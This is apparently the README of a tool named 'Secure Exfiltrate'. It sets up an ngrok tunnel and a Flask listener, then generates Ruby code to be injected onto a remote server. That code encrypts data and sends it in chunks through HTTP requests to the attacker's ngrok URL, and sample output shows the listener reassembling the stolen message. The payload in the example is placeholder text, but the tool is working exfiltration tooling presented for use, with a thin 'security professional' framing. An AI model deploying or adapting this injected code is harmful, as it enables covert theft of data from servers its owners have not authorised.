# Secure Exfiltrate

This project sets up a secure channel that can receive messages from an embedded server. It demonstrates the exfiltration of information by injecting remote code onto a server. However, as a security professional, it ensures that the extracted information is not compromised.

## Prerequisites

Before running this project, make sure you have the following dependencies installed:

- Node.js
- npm
- ngrok (with an account and agent authtoken configured)
- Python 3

## Installation

1. Install the `concurrently` package globally by running the following command:

   ```bash
   npm install -g concurrently
   ```

2. Clone this repository:

   ```bash
   git clone https://github.com/your-username/secure-exfiltrate.git
   ```

3. Navigate to the project directory:

   ```bash
   cd secure_exfiltrate
   ```

## Usage

To start the main service and set up the ngrok tunnel, run the following command:

```bash
make start
```

Example Runtime output (NOTE: the key is randomly generated each time):

```bash
Starting services with concurrently...
Ngrok URL: https://f8d5-98-225-53-234.ngrok-free.app
Ruby Code to inject, for safe transmission:
=================================

require 'openssl'
require 'base64'
require 'net/http'
require 'uri'

debug = false
payload = "hello world " * 1000
public_key = OpenSSL::PKey::RSA.new("-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvXmwmaNq0EmOUOYh4tOh\nd4VYOdr3CmCRcS3FVyjt473v+KFqQElB3domKHRQt4yAaAly4Yi9m6DbMOTzOL5E\ni8lkY4Y9Lw0n7VFLiqVGQQOObAcdyEQ7G5kCZ6xAk7xoF25kXfSkAPpaejvGZKeR\niX0PVLygfrUT/p9grc3nTJGk1COH7dHX7HTW8eO8XZDsiRFqLy2K6LVw4ZTkfjMT\n24imFKPuXKT0twmrEpxdKmLv2pCH82VHuu+QWRhxD9E46heAvYvaz0SXt1zNK7wc\nz47A/Pzw+MJcc9jjDkYaCqv2gr1K0ZCANL/2j49a1aoXicn1HGdqrTzSBjhsSWiB\nKwIDAQAB\n-----END PUBLIC KEY-----\n")
chunks = payload.scan(/.{1,#{public_key.n.num_bytes - 42}}/)
midx = (0...10).map { ('a'..'z').to_a[rand(26)] }.join
chunks.each_with_index { |chunk, index| encrypted_chunk = public_key.public_encrypt(chunk); encrypted_base64_chunk = Base64.strict_encode64(encrypted_chunk).strip; encoded_chunk = URI.encode_www_form_component(encrypted_base64_chunk); uri = URI.parse("https://f8d5-98-225-53-234.ngrok-free.app/"); uri.query = "n=" + encoded_chunk + "&m=" + midx + "&x=" + index.to_s + "&z=" + chunks.length.to_s; response = Net::HTTP.get_response(uri); puts "==> " + response.code + ": [" + response.body + "]" if debug }

=================================

 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://127.0.0.1:5000
Press CTRL+C to quit
 ==> Decrypted data for message: #jfltbicvcc part 1 (1/2) -> 214 bytes
127.0.0.1 - - [22/Nov/2023 09:43:08] "GET /?n=WPc2Q/46DDoVPX8K5jMEWfDYB4cPdrp/eNMukimma3qh/3uutOsyOJh7CP9H425FKCgsn95%2B1kJHQYW0Zt%2BwoT87hiKxcyS3NTPu6jazF6H9NewDxIumgKKHuS86JjUfEoTZ9EheS3tLu5IVhhEvEDNnzDrttXfuWDCLUTb%2B4UD2smMdo56KAvghKDwXddh776p%2B9cKQqYkTglq/wbpHPhD3JYofjZA4tVgDdTdrDhPnacrj7A%2B37kPdRon51cG6oWzakd8YhxPzRisUHAG2j2pjLl1bBaHIRs1wKeEzbvk8/JhkZCfApPbPu9qug7KYIHjPrjGx62XwTY2kRWSZQw%3D%3D&m=jfltbicvcc&x=0&z=2 HTTP/1.1" 200 -
 ==> Decrypted data for message: #jfltbicvcc part 2 (2/2) -> 146 bytes
Complete message for message ID jfltbicvcc:
=================================
hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world hello world 
=================================

127.0.0.1 - - [22/Nov/2023 09:43:08] "GET /?n=oP/Ia/A9dJUtg13w/B9iur4Rll7XLVldqrXOchry1Nm56AIguLrB6TrrF%2Bhc0Ok9IXxUrcf0lViHQ1FNqMrxVSf1jhtDEayTlITRgRrY2klPo17%2ByK1FJvToBSIfFkk2ruiCy40lMRycLB1s3BF3%2BIFQx9ivOcu5PopHYpa/JFcXjjZfeFsbRChFPjchgzGWdYoK1huLsPwur5KlYLAolCfU8dRNwuDf5MwjnGbi1U2J1bWTo/GGGtjYVGHMOvX3IvdVnh57AVT%2BgfR75LEP8fTK%2BSfOtzWYNSgCJa2DFMvgLUHd6NgQndRfOtokuW/f5RpEs%2BaKaSOE9puLJiJ/dQ%3D%3D&m=jfltbicvcc&x=1&z=2 HTTP/1.1" 200 -
```
